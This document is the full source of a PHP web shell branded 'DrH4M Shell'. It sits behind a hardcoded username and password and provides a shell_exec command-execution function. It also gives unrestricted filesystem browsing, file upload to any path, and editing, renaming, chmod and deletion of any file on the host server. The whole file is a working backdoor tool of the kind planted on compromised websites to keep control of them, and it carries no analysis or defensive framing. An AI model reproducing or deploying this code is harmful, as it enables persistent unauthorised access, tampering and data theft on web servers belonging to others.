<?php
session_start();

// Define your username and password
$username = "DrH4M";
$password = "yn3aldinak";

// Check if the user is logged in
if (isset($_POST['login'])) {
    if ($_POST['username'] == $username && $_POST['password'] == $password) {
        $_SESSION['loggedin'] = true;
    } else {
        echo '<div class="error">Invalid username or password.</div>';
    }
}

// If the user is not logged in, show the login form
if (!isset($_SESSION['loggedin'])) {
    echo '<!DOCTYPE HTML>
    <HTML>
    <HEAD>
    <title>Login</title>
    <style>
        body { font-family: "Courier New", Courier, monospace; background-color: #f0f0f0; color: black; text-align: center; }
        form { display: inline-block; margin-top: 100px; padding: 20px; border: 1px solid #ccc; border-radius: 10px; background-color: white; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        input[type="text"], input[type="password"] { padding: 10px; margin: 5px; width: 200px; border-radius: 5px; border: 1px solid #ccc; }
        input[type="submit"] { padding: 10px 20px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
        input[type="submit"]:hover { background-color: #0056b3; }
        h1 { color: #333; }
        .error { color: red; }
    </style>
    </HEAD>
    <BODY>
    <h1>🔐 Login</h1>
    <form method="POST">
        <input type="text" name="username" placeholder="Username" required /><br />
        <input type="password" name="password" placeholder="Password" required /><br />
        <input type="submit" name="login" value="Login" />
    </form>
    </BODY>
    </HTML>';
    exit;
}

// Function to execute commands
function executeCommand($cmd) {
    $output = shell_exec($cmd);
    return nl2br(htmlspecialchars($output));
}

// Initialize messages for displaying action results
$actionMessage = "";

// File management logic below this line
echo '<!DOCTYPE HTML>
<HEAD>
<title>DrH4M Shell</title>
<style>
    body { font-family: "Courier New", Courier, monospace; background-color: #f0f0f0; color: black; }
    h1 { text-align: center; font-size: 24px; font-weight: bold; }
    .container { max-width: 900px; margin: auto; background: white; border-radius: 10px; padding: 20px; box-shadow: 0 0 15px rgba(0,0,0,0.1); position: relative; }
    .path { font-weight: bold; color: #007bff; margin: 20px 0; font-size: 18px; }
    button, select, input[type="submit"], input[type="button"] {
        padding: 10px; 
        border-radius: 5px; 
        border: 1px solid #007bff; 
        background-color: #007bff; 
        color: white; 
        cursor: pointer; 
        margin: 5px;
        font-weight: bold;
    }
    button:hover, select:hover, input[type="submit"]:hover, input[type="button"]:hover { background-color: #0056b3; }
    .message { margin: 10px 0; }
    .logout-button { position: absolute; top: 20px; right: 20px; }
    .table-container { max-height: 400px; overflow-y: scroll; border: 1px solid #ccc; border-radius: 5px; margin-bottom: 20px; }
    table { width: 100%; border-collapse: collapse; }
    th, td { padding: 10px; text-align: center; font-size: 18px; } /* Increased text size */
    tr:nth-child(even) { background-color: #e9ecef; }
    textarea { width: 100%; border-radius: 5px; border: 1px solid #ccc; }
    input[type="text"] { width: 80%; margin-right: 5px; }
    select { width: 100%; }
    .terminal { background-color: #282c34; color: #61dafb; padding: 10px; border-radius: 5px; margin-top: 20px; }
    a { color: #007bff; text-decoration: none; }
    a:hover { text-decoration: underline; }
    .visited { color: #007bff; } /* Color for visited directories */
    /* Enhanced button styles */
    .file-upload-button {
        border: none;
        padding: 10px 15px;
        color: white;
        background-color: #007bff;
        border-radius: 5px;
        cursor: pointer;
    }
    .file-upload-button:hover {
        background-color: #0056b3;
    }
    .form-select {
        display: inline-block;
        width: auto; /* Adjust width for inline display */
    }
    .styled-form {
        background-color: #f7f7f7;
        padding: 20px;
        border-radius: 10px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        margin: 10px 0;
    }
</style>
</HEAD>
<BODY>
<div class="container">
<H1>🖥️ DrH4M Shell 🖥️</H1>
<p class="path">Current Path: ';

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = str_replace('\\', '/', $path);
$paths = explode('/', $path);

foreach ($paths as $id => $pat) {
    if ($pat == '' && $id == 0) {
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if ($pat == '') continue;
    $visitedPath = implode('/', array_slice($paths, 0, $id + 1)); // Generate visited path
    echo '<a href="?path=' . $visitedPath . '" class="' . ($id == count($paths) - 1 ? 'visited' : '') . '">' . htmlspecialchars($pat) . '</a>/';
}
echo '</p>';

// Handle file upload
if (isset($_FILES['file'])) {
    if (move_uploaded_file($_FILES['file']['tmp_name'], $path.'/'.$_FILES['file']['name'])) {
        $actionMessage .= '<div class="message">✅ File Upload Done.</div>';
    } else {
        $actionMessage .= '<div class="message error">❌ File Upload Error.</div>';
    }
}

// Updated file upload section
echo '<form enctype="multipart/form-data" method="POST" style="margin-bottom: 20px;">
    <input type="file" name="file" required style="display: none;" id="fileInput" />
    <label for="fileInput" class="file-upload-button">📁 Browse...</label>
    <button type="submit" class="file-upload-button">Upload</button>
</form>';

// New File and Directory buttons
echo '<form method="POST" style="margin-bottom: 20px;">
    <button type="submit" name="new_file" class="file-upload-button">📄 New File</button>
    <button type="submit" name="new_directory" class="file-upload-button">📂 New Directory</button>
</form>';

// Handle New File
if (isset($_POST['new_file'])) {
    $newFileName = "newfile.txt"; // Default new file name
    file_put_contents("$path/$newFileName", ""); // Create an empty file
    $actionMessage .= '<div class="message">✅ New file created: ' . htmlspecialchars($newFileName) . '</div>';
}

// Handle New Directory
if (isset($_POST['new_directory'])) {
    $newDirName = "new_directory"; // Default new directory name
    mkdir("$path/$newDirName", 0777); // Create a new directory
    $actionMessage .= '<div class="message">✅ New directory created: ' . htmlspecialchars($newDirName) . '</div>';
}

// Display files and directories
$files = scandir($path);
echo '<div class="table-container">';
echo '<table>';
echo '<tr><th>Type</th><th>Name</th><th>Actions</th></tr>';
foreach ($files as $file) {
    if ($file === '.' || $file === '..') continue;
    $filePath = "$path/$file";
    $isDir = is_dir($filePath);
    echo '<tr>';
    echo '<td>' . ($isDir ? '📁' : '📄') . '</td>';
    echo '<td><a href="?path=' . urlencode($filePath) . '" class="file-name">' . htmlspecialchars($file) . '</a></td>';
    echo '<td>
            <form method="POST" class="form-select">
                <select name="action" onchange="this.form.submit()">
                    <option value="">Select Action</option>
                    <option value="rename">📝 Rename</option>
                    <option value="chmod">🔒 Chmod</option>
                    <option value="compress">📦 Compress</option>
                    <option value="unzip">📤 Unzip</option>
                    <option value="edit">✏️ Edit</option>
                    <option value="delete">🗑️ Delete</option>
                </select>
                <input type="hidden" name="file" value="' . htmlspecialchars($filePath) . '" />
            </form>
          </td>';
    echo '</tr>';
}
echo '</table>';
echo '</div>';

// Handle actions
if (isset($_POST['action']) && isset($_POST['file'])) {
    $fileAction = $_POST['action'];
    $targetFile = $_POST['file'];

    switch ($fileAction) {
        case 'rename':
            $currentName = basename($targetFile);
            echo '<div class="styled-form">
                    <form method="POST">
                        <input type="text" name="new_name" placeholder="New name for ' . htmlspecialchars($currentName) . '" required />
                        <input type="hidden" name="target_file" value="' . htmlspecialchars($targetFile) . '" />
                        <input type="submit" name="save_rename" value="💾 Rename" />
                    </form>
                  </div>';
            break;
        case 'chmod':
            $chmodValue = '755'; // Example chmod value
            chmod($targetFile, octdec($chmodValue));
            $actionMessage .= '<div class="message">✅ Permissions changed to: ' . htmlspecialchars($chmodValue) . '</div>';
            break;
        case 'compress':
            // Here, you can add the logic to compress files.
            // This is just an example to show that the action was taken.
            $actionMessage .= '<div class="message">📦 Compressing: ' . htmlspecialchars(basename($targetFile)) . '</div>';
            break;
        case 'unzip':
            // Logic for unzipping (if it’s a zip file)
            $actionMessage .= '<div class="message">📤 Unzipping: ' . htmlspecialchars(basename($targetFile)) . '</div>';
            break;
        case 'edit':
            if (!is_dir($targetFile) && file_exists($targetFile)) {
                if (pathinfo($targetFile, PATHINFO_EXTENSION) != 'jpg' && pathinfo($targetFile, PATHINFO_EXTENSION) != 'png') {
                    $fileContent = file_get_contents($targetFile);
                    echo '<div class="styled-form">
                            <form method="POST">
                                <textarea name="content" rows="10">' . htmlspecialchars($fileContent) . '</textarea><br />
                                <input type="hidden" name="target_file" value="' . htmlspecialchars($targetFile) . '" />
                                <input type="submit" name="save_edit" value="💾 Save" />
                            </form>
                          </div>';
                } else {
                    $actionMessage .= '<div class="message error">🔍 You cannot edit image files directly.</div>';
                }
            }
            break;
        case 'delete':
            unlink($targetFile);
            $actionMessage .= '<div class="message">🗑️ File deleted: ' . htmlspecialchars(basename($targetFile)) . '</div>';
            break;
        default:
            break;
    }
}

// Handle rename action submission
if (isset($_POST['save_rename']) && isset($_POST['target_file'])) {
    $targetFile = $_POST['target_file'];
    $newName = $_POST['new_name'];
    $newFilePath = dirname($targetFile) . '/' . $newName;

    if (rename($targetFile, $newFilePath)) {
        $actionMessage .= '<div class="message">✅ File renamed to: ' . htmlspecialchars($newName) . '</div>';
    } else {
        $actionMessage .= '<div class="message error">❌ Error renaming file.</div>';
    }
}

// Save edited content
if (isset($_POST['save_edit']) && isset($_POST['target_file'])) {
    $targetFile = $_POST['target_file'];
    file_put_contents($targetFile, $_POST['content']);
    $actionMessage .= '<div class="message">✅ File saved: ' . htmlspecialchars(basename($targetFile)) . '</div>';
}

// Display any action messages at the top
if ($actionMessage) {
    echo '<div class="message">' . $actionMessage . '</div>';
}

// Logout button
echo '<form method="POST" class="logout-button">
        <input type="submit" name="logout" value="🚪 Logout" />
      </form>';

// Handle logout
if (isset($_POST['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

echo '</div>'; // End of container
echo '</BODY></HTML>';
